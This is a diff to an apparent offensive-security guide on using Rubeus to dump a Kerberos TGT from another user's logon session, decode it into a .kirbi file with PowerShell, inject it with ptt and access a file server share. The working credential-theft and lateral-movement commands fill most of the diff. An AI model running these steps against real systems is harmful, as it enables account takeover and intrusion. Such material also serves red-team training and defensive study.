@@ -86,11 +86,18 @@ After reviewing `triage`, target the relevant LUID:
 
 ### Save One Ticket as a `.kirbi` File
 
+`dump` does not support `/outfile`. The `dump` command prints the ticket as Base64 text, so decode the blob yourself:
+
 ```powershell
-.\Rubeus.exe dump /luid:0x777062 /service:krbtgt /outfile:C:\Temp\tgt_0x777062.kirbi
+$raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String
+
+$b64 = [regex]::Match($raw, '[A-Za-z0-9+/=]{100,}').Value
+if ($b64) {
+    [IO.File]::WriteAllBytes('C:\Temp\tgt_0x777062.kirbi', [Convert]::FromBase64String($b64))
+}
 ```
 
-`/outfile` writes a single `.kirbi` file. It does not automatically create separate `.kirbi` files for every extracted ticket.
+This approach works for one ticket; run it once per LUID and service. See the conversion script below for every ticket in one pass.
 
 ## Export All Tickets
 
@@ -212,8 +219,10 @@ Access succeeds only if the account associated with the ticket has the required 
 # 1. Identify available tickets and sessions
 .\Rubeus.exe triage
 
-# 2. Extract a TGT from a selected LUID
-.\Rubeus.exe dump /luid:0x777062 /service:krbtgt /outfile:C:\Temp\tgt.kirbi
+# 2. Extract a TGT from a selected LUID and decode the Base64 blob into a .kirbi file
+$raw = .\Rubeus.exe dump /luid:0x777062 /service:krbtgt /nowrap | Out-String
+$b64 = [regex]::Match($raw, '[A-Za-z0-9+/=]{100,}').Value
+[IO.File]::WriteAllBytes('C:\Temp\tgt.kirbi', [Convert]::FromBase64String($b64))
 
 # 3. Inject the TGT into the current session
 .\Rubeus.exe ptt /ticket:C:\Temp\tgt.kirbi
@@ -232,9 +241,9 @@ dir \\fileserver.corp.local\c$
 - Use `/luid` to target a specific logon session.
 - Use `/service:krbtgt` to extract TGTs.
 - Use `/nowrap` for single-line Base64 output.
-- Use `/outfile` to save one ticket as a `.kirbi` file.
+- `dump` has no `/outfile` switch; decode the Base64 blob into a `.kirbi` file yourself.
 - Use `ptt` to inject a ticket.
-- Use `asktgs` to request service tickets using a TGT.
+- Use `asktgs` to request service tickets using a TGT; `asktgs` supports `/outfile`.
 - A valid TGT enables further ticket requests; a service ticket is bound to one service.
 - Elevated privileges are required to target tickets in other users' logon sessions.
 
